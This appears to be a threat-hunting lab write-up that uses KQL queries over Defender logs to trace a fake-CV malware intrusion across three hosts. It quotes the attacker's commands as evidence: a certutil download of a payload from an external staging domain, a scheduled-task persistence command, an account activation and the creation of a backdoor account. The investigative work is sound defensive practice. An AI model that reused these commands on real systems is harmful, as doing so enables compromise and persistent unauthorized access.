Sanc Logic
🚩 Initial Vector
Identify the file that started the infection chain.
DeviceProcessEvents
| where TimeGenerated between (datetime(2026-01-01T00:00:00) .. datetime(2026-02-01T00:00:00))
| where DeviceName == "as-pc1"
| where InitiatingProcessFileName == "daniel_richardson_cv.pdf.exe"
What is the filename?*Daniel_Richardson_CV.pdf.exe 2026-01-15T03:58:55.6563735Z
🚩 Payload Hash
Identify the SHA256 hash of the initial payload.
DeviceProcessEvents
| where TimeGenerated between (datetime(2026-01-01T00:00:00) .. datetime(2026-02-01T00:00:00))
| where DeviceName == "as-pc1"
| where InitiatingProcessFileName == "daniel_richardson_cv.pdf.exe"
| project SHA256
Format: SHA256 hash
What is the file hash?
*48b97fd91946e81e3e7742b3554585360551551cbf9398e1f34f4bc4eac3a6b5
🚩 User Interaction
Determine how the payload was initially launched.
DeviceProcessEvents
| where TimeGenerated between (datetime(2026-01-01T00:00:00) .. datetime(2026-02-01T00:00:00))
| where DeviceName == "as-pc1"
| where InitiatingProcessFileName == "daniel_richardson_cv.pdf.exe"
| project InitiatingProcessParentFileName
What parent process indicates the method of execution?*explorer.exe
🚩 Suspicious Child Process
The payload created a child process for further activity.
DeviceProcessEvents
| where TimeGenerated between (datetime(2026-01-01T00:00:00) .. datetime(2026-02-01T00:00:00))
| where DeviceName == "as-pc1"
| where InitiatingProcessFileName == "daniel_richardson_cv.pdf.exe"
What legitimate Windows process was spawned?*Notepad 2026-01-15T05:09:53.3995975Z
🚩 Process Arguments
The spawned process executed with unusual arguments.
DeviceProcessEvents
| where TimeGenerated between (datetime(2026-01-01T00:00:00) .. datetime(2026-02-01T00:00:00))
| where DeviceName == "as-pc1"
| where InitiatingProcessFileName == "daniel_richardson_cv.pdf.exe"
What was the full command line? notepad.exe "" 2026-01-15T05:10:08.2245676Z
An empty quoted string as the argument suggests the malware is launching it programmatically — possibly as a decoy to make the victim think a document opened normally after double-clicking the fake PDF, masking the malicious activity happening in the background. 


SECTION 2: COMMAND & CONTROL [Moderate] 
🚩 C2 Domain
The payload established outbound connections.
DeviceNetworkEvents
| where TimeGenerated between (datetime(2026-01-01T00:00:00) .. datetime(2026-02-01T00:00:00))
| where DeviceName == "as-pc1"
| where InitiatingProcessFileName == "daniel_richardson_cv.pdf.exe"
What domain was used for command and control?*2026-01-15T03:47:10.786699Z cdn.cloud-endpoint.net
🚩 C2 Process
Identify the process responsible for C2 traffic.
What process initiated the outbound connections?*"daniel_richardson_cv.pdf.exe"
🚩 Staging Infrastructure
Additional payloads were hosted externally.
DeviceProcessEvents
| where TimeGenerated between (datetime(2026-01-01T00:00:00) .. datetime(2026-02-01T00:00:00))
| where ProcessCommandLine contains "Daniel"
What domain was used for payload staging?*"certutil.exe" -urlcache -split -f https://sync.cloud-endpoint.net/Daniel_Richardson_CV.pdf.exe C:\Users\Public\RuntimeBroker.exe  2026-01-15T04:52:22.9618142Z 
DeviceName: as-pc2
SECTION 3: CREDENTIAL ACCESS [Hard] 
🚩Registry Targets
The attacker targeted local credential stores.
DeviceProcessEvents
| where TimeGenerated between (datetime(2026-01-01T00:00:00) .. datetime(2026-02-01T00:00:00))
| where DeviceName == "as-pc1"
| where FileName =~ "reg.exe"
| project TimeGenerated, DeviceName, ProcessCommandLine, InitiatingProcessFileName
What two registry hives were targeted?*Sam, SYSTEM


🚩 Local Staging
Extracted data was saved locally before exfiltration.
DeviceProcessEvents
| where TimeGenerated between (datetime(2026-01-01T00:00:00) .. datetime(2026-02-01T00:00:00))
| where DeviceName == "as-pc1"
| where FileName =~ "reg.exe"
| project TimeGenerated, DeviceName, ProcessCommandLine, InitiatingProcessFileName


Where were the credential files saved?
*C:\Users\Public\
🚩 Execution Identity
Credential extraction was performed under a specific user context.
DeviceProcessEvents
| where TimeGenerated between (datetime(2026-01-01T00:00:00) .. datetime(2026-02-01T00:00:00))
| where DeviceName == "as-pc1"
| where FileName =~ "reg.exe"
| project TimeGenerated, AccountName, DeviceName, ProcessCommandLine, InitiatingProcessFileName
What user performed this action?*sophie.turner


SECTION 4: DISCOVERY [Moderate] 
🚩 User Context
The attacker confirmed their identity after initial access.
DeviceProcessEvents
| where TimeGenerated between (datetime(2026-01-01T00:00:00) .. datetime(2026-02-01T00:00:00))
| where DeviceName == "as-pc1"
| where InitiatingProcessFileName == "daniel_richardson_cv.pdf.exe"
| project TimeGenerated, AccountName, DeviceName, ProcessCommandLine, InitiatingProcessFileName


What command was used?
*whoami.exe
🚩 Network Enumeration
The attacker enumerated network resources.
DeviceProcessEvents
| where TimeGenerated between (datetime(2026-01-01T00:00:00) .. datetime(2026-02-01T00:00:00))
| where DeviceName == "as-pc1"
| where InitiatingProcessFileName == "daniel_richardson_cv.pdf.exe"
| project TimeGenerated, AccountName, DeviceName, ProcessCommandLine, InitiatingProcessFileName


What command was used to view available shares?
*net.exe view
🚩 Local Admins
The attacker enumerated privileged local group membership.
DeviceProcessEvents
| where TimeGenerated between (datetime(2026-01-01T00:00:00) .. datetime(2026-02-01T00:00:00))
| where DeviceName == "as-pc1"
| where InitiatingProcessFileName == "daniel_richardson_cv.pdf.exe"
| project TimeGenerated, AccountName, DeviceName, ProcessCommandLine, InitiatingProcessFileName


What group was queried?*administrators
SECTION 5: PERSISTENCE - REMOTE TOOL [Hard] 
🚩 Remote Tool
A legitimate remote administration tool was deployed for ongoing access.
DeviceProcessEvents
| where TimeGenerated between (datetime(2026-01-01T00:00:00) .. datetime(2026-02-01T00:00:00))
| where DeviceName == "as-pc1"
| where InitiatingProcessFileName == "daniel_richardson_cv.pdf.exe"
| project TimeGenerated, AccountName, DeviceName, ProcessCommandLine, InitiatingProcessFileName
What software was installed?
*anydesk
🚩 Remote Tool Hash
Identify the SHA256 hash of the remote access tool.
DeviceFileEvents
| where TimeGenerated between (datetime(2026-01-01T00:00:00) .. datetime(2026-02-01T00:00:00))
| where DeviceName == "as-pc1"
| where FileName contains "anydesk"


What is the file hash?
*f42b635d93720d1624c74121b83794d706d4d064bee027650698025703d20532
🚩 Download Method
The tool was downloaded using a native Windows binary.
DeviceProcessEvents
| where TimeGenerated between (datetime(2026-01-01T00:00:00) .. datetime(2026-02-01T00:00:00))
| where DeviceName == "as-pc1"
| where InitiatingProcessFileName == "daniel_richardson_cv.pdf.exe"
| project TimeGenerated, AccountName, FileName , DeviceName, ProcessCommandLine, InitiatingProcessFileName, SHA256
What binary/executable was used?
*certutil
🚩 Configuration Access
After installation, a configuration file was accessed.
DeviceProcessEvents
| where TimeGenerated between (datetime(2026-01-01T00:00:00) .. datetime(2026-02-01T00:00:00))
| where DeviceName == "as-pc1"
| where InitiatingProcessFileName == "daniel_richardson_cv.pdf.exe"
| project TimeGenerated, AccountName, FileName , DeviceName, ProcessCommandLine, InitiatingProcessFileName, SHA256
What is the full path of this file?
*C:\Users\Sophie.Turner\AppData\Roaming\AnyDesk\system.conf
🚩 Access Credentials
Unattended access was configured for the remote tool.
DeviceProcessEvents
| where TimeGenerated between (datetime(2026-01-01T00:00:00) .. datetime(2026-02-01T00:00:00))
| where DeviceName == "as-pc1"
| where InitiatingProcessFileName == "daniel_richardson_cv.pdf.exe"
| project TimeGenerated, AccountName, FileName , DeviceName, ProcessCommandLine, InitiatingProcessFileName, SHA256
What password was set?
*intrud3r!
🚩 Deployment Footprint
The remote tool was installed across the environment.
DeviceFileEvents
| where TimeGenerated between (datetime(2026-01-01T00:00:00) .. datetime(2026-02-01T00:00:00))
| where FolderPath contains "AnyDesk"
| project TimeGenerated, FileName , DeviceName, InitiatingProcessFileName, SHA256


List all hostnames where it was deployed.
*as-pc1, as-pc2, as-srv
SECTION 6: LATERAL MOVEMENT [Advanced] 
🚩 Failed Execution
The attacker attempted remote execution methods that failed.
DeviceProcessEvents
| where TimeGenerated between (datetime(2026-01-01T00:00:00) .. datetime(2026-02-01T00:00:00))
| where DeviceName has_any ("as-pc1", "as-pc2", "as-srv")
| where FileName in~ ("psexec.exe", "wmic.exe", "psexec64.exe", "paexec.exe")
| project TimeGenerated, AccountName, DeviceName, FileName, ProcessCommandLine
What two tools were tried?
*WMIC.exe, PsExec.exe 2026-01-15T04:18:44.6123349Z
🚩 Target Host
Remote execution was attempted against a specific system.
DeviceProcessEvents
| where TimeGenerated between (datetime(2026-01-01T00:00:00) .. datetime(2026-02-01T00:00:00))
| where DeviceName has_any ("as-pc1", "as-pc2", "as-srv")
| where FileName in~ ("psexec.exe", "wmic.exe", "psexec64.exe", "paexec.exe")
| project TimeGenerated, AccountName, DeviceName, FileName, ProcessCommandLine
What two tools were tried?
What hostname was targeted in the failed attempts?
*as-pc2
🚩 Successful Pivot
After failed attempts, a different method achieved lateral movement.
DeviceNetworkEvents
| where TimeGenerated between (datetime(2026-01-01T00:00:00) .. datetime(2026-02-01T00:00:00))
| where DeviceName == "as-pc2"
| where RemotePort == 3389
What Windows executable was used?
*mstsc.exe (Windows RDP)
🚩  Movement Path
The attacker moved through the environment in a specific sequence.
What is the full lateral movement path?
*as-pc1 — Initial infection point, daniel_richardson_cv.pdf.exe executed by sophie.turner. Everything started here.
as-pc2 — Attacker moved here via RDP (mstsc.exe) after PsExec and WMIC failed. RuntimeBroker.exe deployed here, shadow copies deleted.
as-srv — AnyDesk was found deployed on all three machines including as-srv, meaning the attacker eventually reached the server too.
🚩 Compromised Account
A valid account was used for successful lateral movement.
Format: Username
What username authenticated successfully?
*david.mitchell
🚩 Account Activation
A disabled account was enabled for further access.
DeviceProcessEvents
| where TimeGenerated between (datetime(2026-01-01T00:00:00) .. datetime(2026-02-01T00:00:00))
| where DeviceName has_any ("as-pc1", "as-pc2", "as-srv")
| where ProcessCommandLine has_any ( "active:yes")
| project TimeGenerated, DeviceName, FileName, ProcessCommandLine, AccountName
| sort by TimeGenerated asc 
What net.exe parameter was used to activate the account?
*"net.exe" user Administrator /active:yes 2026-01-15T04:40:31.9488698Z as-pc2  david.mitchell
🚩 Activation Context
The account activation was performed by a specific user.


Who performed this action?  David.mitchell
SECTION 7: PERSISTENCE - SCHEDULED TASK [Hard] 
🚩 Scheduled Persistence
A scheduled task was created for persistence.
DeviceProcessEvents
| where TimeGenerated between (datetime(2026-01-01T00:00:00) .. datetime(2026-02-01T00:00:00))
| where DeviceName == "as-pc2"
| where ProcessCommandLine contains "runtime"
| project TimeGenerated, DeviceName, FileName, ProcessCommandLine
| sort by TimeGenerated asc 
What is the task name?
*MicrosoftEdgeUpdateCheck
2026-01-15T04:52:32.6871861Z
"schtasks.exe" /create /tn MicrosoftEdgeUpdateCheck /tr C:\Users\Public\RuntimeBroker.exe /sc daily /st 03:00 /rl highest /f
🚩 Renamed Binary
The persistence payload was renamed to avoid detection.
Format: Filename
What filename was used?
*RuntimeBroker.exe
2026-01-15T04:52:22.9618142Z
"certutil.exe" -urlcache -split -f https://sync.cloud-endpoint.net/Daniel_Richardson_CV.pdf.exe C:\Users\Public\RuntimeBroker.exe
🚩 Persistence Hash
The persistence payload shares a hash with another file in the investigation.
//Find the renamed file w/hash
DeviceFileEvents
| where TimeGenerated between (datetime(2026-01-01T00:00:00) .. datetime(2026-02-01T00:00:00))
| where DeviceName == "as-pc2"
| where FileName =~ "RuntimeBroker.exe"
| project TimeGenerated, FileName, SHA256, FolderPath
//find all files matching hash
| where SHA256 == "48b97fd91946e81e3e7742b3554585360551551cbf9398e1f34f4bc4eac3a6b5"
Format: SHA256 hash
What is the SHA256 hash
*48b97fd91946e81e3e7742b3554585360551551cbf9398e1f34f4bc4eac3a6b5
🚩 Backdoor Account
A new local account was created for future access.
DeviceProcessEvents
| where TimeGenerated between (datetime(2026-01-01T00:00:00) .. datetime(2026-02-01T00:00:00))
| where DeviceName has_any ("as-pc1", "as-pc2", "as-srv")
| where ProcessCommandLine contains "user"
| where FileName contains "net.exe"
| project TimeGenerated, DeviceName, FileName, ProcessCommandLine
| sort by TimeGenerated asc 
What is the username?
*net.exe user svc_backup ********** /add
SECTION 8: DATA ACCESS [Hard] 
🚩 Sensitive Document
A sensitive document was accessed on the file server.
//exfildata.zip found
DeviceEvents
| where TimeGenerated between (datetime(2026-01-01T00:00:00) .. datetime(2026-02-01T00:00:00))
| where DeviceName has_any ("as-srv")
| where FileName contains "confidential"
| where ActionType contains "SensitiveFileRead"


DeviceFileEvents
| where TimeGenerated between (datetime(2026-01-01T00:00:00) .. datetime(2026-02-01T00:00:00))
| where DeviceName has_any ("as-srv")
| where ActionType contains "FileModified"


DeviceFileEvents
| where TimeGenerated between (datetime(2026-01-01T00:00:00) .. datetime(2026-02-01T00:00:00))
| where DeviceName has_any ("as-srv")
| where ActionType contains "FileCreated"
| sort by TimeGenerated asc 




What is the filename?*































































Notes: 
//disabling AV tools through command line:
DeviceProcessEvents
| where TimeGenerated between (datetime(2026-01-01T00:00:00) .. datetime(2026-02-01T00:00:00))
| where DeviceName == "as-pc2"
| where FileName =~ "reg.exe"
| project TimeGenerated, DeviceName, ProcessCommandLine, InitiatingProcessFileName


//shows shadow copy deletion
DeviceProcessEvents
| where TimeGenerated between (datetime(2026-01-01T00:00:00) .. datetime(2026-02-01T00:00:00))
| where DeviceName has_any ("as-pc1", "as-pc2", "as-srv")
| where FileName in~ ("psexec.exe", "wmic.exe", "psexec64.exe", "paexec.exe")
| project TimeGenerated, AccountName, DeviceName, FileName, ProcessCommandLine


//persistence
DeviceProcessEvents
| where TimeGenerated between (datetime(2026-01-01T00:00:00) .. datetime(2026-02-01T00:00:00))
| where DeviceName == "as-pc2"
| where ProcessCommandLine contains "runtime"
| project TimeGenerated, DeviceName, FileName, ProcessCommandLine
| sort by TimeGenerated asc 


//exfildata.zip found
DeviceEvents
| where TimeGenerated between (datetime(2026-01-01T00:00:00) .. datetime(2026-02-01T00:00:00))
| where DeviceName has_any ("as-pc1", "as-pc2", "as-srv")
| where ActionType contains "SensitiveFileRead"









